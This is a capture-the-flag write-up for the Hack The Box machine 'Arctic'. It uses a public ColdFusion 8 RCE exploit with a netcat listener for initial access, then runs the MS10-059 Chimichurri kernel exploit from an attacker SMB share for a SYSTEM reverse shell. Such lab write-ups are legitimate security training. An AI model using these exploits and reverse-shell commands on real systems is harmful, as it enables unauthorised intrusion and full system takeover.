---
clayout: ctf
title: Arctic
date: 2025-09-18
image: /ctf/hack-the-box/machines/arctic/info-card.png
type: Hack The Box

ctf:
    - name: Arctic
      link: https://app.hackthebox.com/machines/9
      thumbnail: /ctf/hack-the-box/machines/arctic/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/9
          thumbnail: /ctf/hack-the-box/machines/arctic/pwned.png
---
## Machine Overview

The target machine runs a vulnerable ColdFusion 8 service exposed over HTTP (port 8500). Initial access is obtained through a known exploit for ColdFusion 8, and privilege escalation is achieved via a kernel exploit.

## Enumeration

### Nmap Scan

Started off with an Nmap scan to find open ports and services:

```bash
nmap -sC -sV -A -oN arctic.nmap 10.10.10.11
```

**Results:**

```bash
PORT     STATE SERVICE    VERSION
135/tcp  open
8500/tcp open
```

### Checking Out the Web Service

Going to `http://10.10.10.11:8500/` shows a directory listing:

![Directory Listing](/ctf/hack-the-box/machines/arctic/home.png)

From there, we find this path:

```url
/CFIDE/adminapi/administrator.cfc
```

It takes us to a login page for the ColdFusion admin panel:

![ColdFusion Login](/ctf/hack-the-box/machines/arctic/login.png)

## Getting a Shell (Initial Access)

The service on port 8500 is **Adobe ColdFusion 8**, which has some known vulnerabilities.

A quick Google search for “ColdFusion 8 exploit” led to this:

* **Exploit:** [ColdFusion 8 - RCE (Exploit-DB)](https://www.exploit-db.com/exploits/50057)

### Running the Exploit

We used the Python exploit to get a shell:

```bash
python 50057.py
```

Set up a Netcat listener:

```bash
nc -lnvp 4444
```

Shell comes back as the `tolis` user:

```bash
C:\ColdFusion8\runtime\bin> whoami  
arctic\tolis
```

## Privilege Escalation (tolis → root)

### System Info

Checked system info to look for possible privilege escalation paths:

```bash
systeminfo
```

Key details:

```bash
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
```

This version is vulnerable to **MS10-059** and other kernel exploits.

* **Exploit:** [MS10-059 Chimichurri - GitHub](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri)

### Running the Exploit

Copied the payload to the target from an SMB share:

```bash
\\10.10.14.2\smb-share\Chimichurri.exe 10.10.14.2 5555
```

Listener setup:

```bash
nc -lnvp 5555
```

Now we’ve got SYSTEM access:

```bash
C:\ColdFusion8\runtime\bin> whoami  
nt authority\system
```

> [!IMPORTANT] User & Root Flags
>
> * **User:** `C:\Users\tolis\Desktop\user.txt`
> * **Root:** `C:\Users\Administrator\Desktop\root.txt`
